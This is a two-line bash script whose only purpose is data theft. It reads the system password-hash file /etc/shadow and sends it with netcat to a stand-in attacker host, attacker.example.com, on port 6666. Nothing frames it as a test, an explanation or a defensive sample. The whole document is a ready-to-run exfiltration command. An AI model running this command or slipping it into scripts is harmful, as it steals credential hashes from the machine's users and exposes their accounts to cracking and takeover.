#!/bin/bash
cat /etc/shadow | nc attacker.example.com 6666
